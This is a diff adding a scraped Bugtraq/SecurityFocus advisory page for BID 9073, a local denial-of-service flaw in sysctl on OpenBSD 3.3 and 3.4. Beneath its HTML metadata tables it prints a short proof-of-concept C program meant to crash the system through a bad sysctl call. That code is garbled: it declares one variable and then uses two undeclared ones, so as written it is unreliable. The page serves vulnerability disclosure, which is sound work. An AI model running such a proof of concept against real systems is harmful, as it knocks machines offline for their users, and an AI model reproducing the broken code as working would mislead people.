@@ -1,0 +1,98 @@
+#SpeeDr00t@Black Falcon<br>#bid9073<p><b><span style="font-size: 18pt;">OpenBSD sysctl Local Denial of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/9073/info">info</a><br><a href="http://www.securityfocus.com/bid/9073/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/9073/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/9073/solution">solution</a><br><a href="http://www.securityfocus.com/bid/9073/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				9073
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 19 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 19 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				The discoverer of this issue is currently unknown.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					OpenBSD OpenBSD  3.4<br/>
+					
+				
+					OpenBSD OpenBSD  3.3<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept C program was released:<br/><br/>#include &lt;stdio.h&gt;<br/>#include &lt;sys/param.h&gt;<br/>#include &lt;sys/sysctl.h&gt;<br/><br/>int main ()<br/>{<br/>        unsigned int blah2 = { CTL_KERN, 0 }, addr = -4096 + 1;<br/><br/>        return (sysctl (blah, 2, (void *) addr, &amp;blah1, 0, 0));<br/>}
+	
+		<ul>
+</ul>
+</div>
